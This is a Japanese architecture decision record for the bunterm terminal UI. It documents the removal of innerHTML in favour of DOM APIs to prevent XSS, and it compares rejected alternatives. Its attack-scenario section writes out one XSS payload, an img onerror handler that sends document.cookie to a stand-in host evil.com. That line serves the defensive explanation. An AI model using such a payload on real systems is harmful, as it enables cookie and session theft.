# ADR 078: innerHTML 除去による XSS 防止

## ステータス

採用

## コンテキスト

bunterm のブラウザ側コードでは、ターミナル UI やツールバーの動的 HTML 生成に `innerHTML` を使用していた箇所が複数存在した。

### 問題点

1. **XSS リスク**: ターミナル出力にはユーザー入力やコマンド出力が含まれる。これらを `innerHTML` で DOM に挿入すると、悪意のあるスクリプトが実行される可能性がある
2. **CSP 違反**: Content Security Policy で `unsafe-inline` を禁止すると `innerHTML` によるスクリプト注入はブロックされるが、そもそも `innerHTML` を使用しないことが根本的な対策
3. **パフォーマンス**: `innerHTML` による再描画はブラウザが HTML を再パースするため、DOM API による差分更新より非効率

### 攻撃シナリオ

```bash
# ターミナルで悪意のある出力を生成
echo '<img src=x onerror="fetch(\"https://evil.com/steal?cookie=\"+document.cookie)">'
```

この出力が `innerHTML` 経由で DOM に挿入されると、Cookie 窃取などの攻撃が成立する。

## 決定

### innerHTML の体系的除去

ブラウザ側コード全体から `innerHTML` を除去し、DOM API に置換する。

#### 置換パターン

```typescript
// Before: innerHTML — XSS リスク
container.innerHTML = `<div class="item">${userText}</div>`;

// After: DOM API — 安全
const div = document.createElement("div");
div.className = "item";
div.textContent = userText;  // textContent はスクリプトを実行しない
container.appendChild(div);
```

#### 対象範囲

- ツールバー UI のコンポーネント生成
- セッション一覧の動的表示
- 通知メッセージの表示
- Block UI のコンテンツ表示
- その他すべてのブラウザ側動的 HTML 生成

### 例外

`innerHTML` の使用が許可されるケースはない。すべて DOM API（`createElement`, `textContent`, `appendChild`）で代替する。

## 代替案

### DOMPurify によるサニタイズ

```typescript
import DOMPurify from "dompurify";
container.innerHTML = DOMPurify.sanitize(html);
```

**採用しなかった理由**:
- 外部依存の追加が必要
- サニタイズはバイパスされる可能性がある（ライブラリのバグ、設定ミス）
- DOM API で構築すれば根本的に安全で、サニタイズ自体が不要

### テンプレートリテラル + エスケープ関数

```typescript
function escapeHtml(str: string): string { /* ... */ }
container.innerHTML = `<div>${escapeHtml(text)}</div>`;
```

**採用しなかった理由**:
- エスケープ関数の呼び忘れリスク
- 新しいコンテキスト（属性値、URL 等）ごとにエスケープ方法が異なる
- DOM API なら文脈を問わず安全

### innerHTML の維持 + CSP で防御

**採用しなかった理由**:
- 多層防御の原則に反する（CSP はフォールバックであり、主防御ではない）
- CSP の設定ミスで防御が崩壊する
- `innerHTML` がコードベースに残る限り、将来の開発者が安全でない使い方をするリスク

## 影響

### Positive

- **XSS の根本的排除**: `innerHTML` がないため、スクリプト注入が構造的に不可能
- **CSP 強化**: `unsafe-inline` なしの厳格な CSP を採用可能
- **セキュリティ監査の簡素化**: `innerHTML` の使用がゼロであることを確認するだけでよい
- **パフォーマンス**: DOM API による差分更新はブラウザの最適化が効きやすい

### Negative

- **コード量の増加**: DOM API は `innerHTML` より冗長
- **可読性**: テンプレート文字列に比べ、DOM 構築コードは構造が読み取りにくい場合がある

## 関連

- ADR 013: Security Hardening
- ADR 061: CSP Nonce Portal External Files
